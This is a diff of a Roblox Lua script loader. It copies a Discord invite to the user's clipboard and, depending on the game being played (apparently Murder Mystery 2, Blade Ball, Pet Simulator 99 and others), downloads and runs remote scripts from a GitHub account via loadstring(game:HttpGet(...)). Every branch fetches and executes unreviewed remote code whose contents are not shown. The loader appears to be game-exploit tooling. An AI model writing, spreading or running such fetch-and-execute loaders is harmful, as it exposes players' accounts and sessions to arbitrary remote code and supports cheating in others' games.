@@ -2,21 +2,23 @@ setclipboard("https://discord.gg/6GMJFxGaJz")
 local placeId = game.PlaceId
 
 local groups = {
-    adm = {920587237},
     mm2 = {142823291, 335132309, 636649648},
+    adm = {920587237},
     bladeball = {15264892126, 16281300371, 14732610803, 15234596844, 13772394625},
     sab = {109983668079237, 96342491571673},
-    ps99 = {, }
+    ps99 = {8737899170}
 }
 
 local groupScripts = {
-    adm = [[
+    mm2 = [[
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testmchoose"))()
+print("mm2")
     ]],
 
-    mm2 = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
+    adm = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("adm")
     ]],
 
     bladeball = [[
@@ -33,6 +35,7 @@ task.spawn(function()
     end)
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/blade-ball-tuffness"))()
+print("bb")
     ]],
 
     sab = [[
@@ -49,17 +52,20 @@ task.spawn(function()
     end)
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/sabv"))()
+print("sab")
     ]],
 
     ps99 = [[
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testd3"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("ps99")
     ]]
 }
 
 local defaultScript = [[
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/testm"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/load"))()
+print("random")
 ]]
 
 local scriptToRun = defaultScript
